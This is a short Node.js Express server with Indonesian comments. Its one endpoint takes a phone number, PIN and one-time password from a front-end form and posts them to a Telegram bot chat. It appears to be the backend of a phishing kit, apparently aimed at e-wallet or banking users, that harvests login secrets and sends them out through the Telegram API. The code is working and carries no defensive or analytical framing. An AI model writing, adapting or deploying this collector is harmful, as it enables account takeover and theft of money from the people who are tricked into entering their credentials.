const express = require('express');
     const axios = require('axios');
     const app = express();
     app.use(express.json());

     require('dotenv').config(); // Untuk membaca environment variables

     const BOT_TOKEN = process.env.BOT_TOKEN; // Token bot diambil dari environment variable
     const CHAT_ID = process.env.CHAT_ID; // Chat ID diambil dari environment variable

     // Endpoint untuk menerima data dari front-end
     app.post('/send-to-telegram', async (req, res) => {
       const { phoneNumber, pin, otp } = req.body;

       // Kirim pesan ke Telegram
       const message = `Nomor Telepon: ${phoneNumber}\nPIN: ${pin}\nOTP: ${otp}`;
       const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

       try {
         const response = await axios.post(url, {
           chat_id: CHAT_ID,
           text: message,
         });
         res.status(200).send('Pesan terkirim ke Telegram');
       } catch (error) {
         console.error('Gagal mengirim pesan:', error);
         res.status(500).send('Gagal mengirim pesan');
       }
     });

     // Jalankan server
     const PORT = process.env.PORT || 3000;
     app.listen(PORT, () => {
       console.log(`Server berjalan di http://localhost:${PORT}`);
     });
